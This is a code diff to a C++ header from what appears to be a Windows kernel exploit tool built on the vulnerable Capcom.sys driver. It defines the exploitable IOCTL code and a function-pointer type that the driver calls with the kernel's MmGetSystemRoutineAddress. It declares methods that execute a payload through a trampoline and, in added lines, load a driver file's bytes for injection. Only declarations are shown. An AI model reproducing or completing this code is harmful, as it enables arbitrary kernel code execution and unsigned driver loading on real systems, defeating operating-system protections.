@@ -1,5 +1,6 @@
 #pragma once
 #include "stdafx.h"
+#include "Win32Kernel.h"
 
 using namespace std;
 
@@ -12,21 +13,9 @@ using namespace std;
 /// The exploitable IOCTL that, when called on the capcom device above, will trigger the payload
 #define CAPCOM_DEVICE_IOCTL64 0xAA013044
 
-/// MMGetSystemRoutine is the GetProcAddress of the kernel. Capcom.sys passes us the address
-/// of this function as the first argument
-typedef PVOID(NTAPI *MMGETSYSTEMROUTINEADDRFUNC)(PUNICODE_STRING SystemRoutineName);
-
 /// Driver calls function passing the address of MmGetSystemRoutineAddress as the first argument
 /// No kernel leak required
-typedef PVOID (NTAPI *CAPCOM_USER_FUNC)(MMGETSYSTEMROUTINEADDRFUNC _MmGetSystemRoutineAddress);
-
-/// Defines a static UNICODE_STRING
-#define DECLARE_UNICODE_STRING(_var, _string) \
-	WCHAR _var ## _buffer[] = _string; \
-	__pragma(warning(push)) \
-	__pragma(warning(disable:4221)) __pragma(warning(disable:4204)) \
-	UNICODE_STRING _var = { sizeof(_string)-sizeof(WCHAR), sizeof(_string), (PWCH)_var ## _buffer } \
-	__pragma(warning(pop))
+typedef PVOID (NTAPI *CAPCOM_USER_FUNC)(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress);
 
 // Struct idea from:
 // https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp
@@ -64,11 +53,19 @@ public:
 	/// Executes the payload using the vulnerable Capcom.sys driver
 	void ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc);
 
+	/// Reads all bytes of a sys file into a std::string
+	void LoadDriverFromFile(const wstring & filename);
+
+	/// Keep the reference to the file alive
+	static string TargetDriverPE;
 private:
+
 
 	/// Returns the location of the driver relative to the current directory
 	wstring GetCapcomDriverPath();
 
 	/// Generates a payload which executes the target function
 	PPAYLOADTRAMP AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc);
+
+	
 };
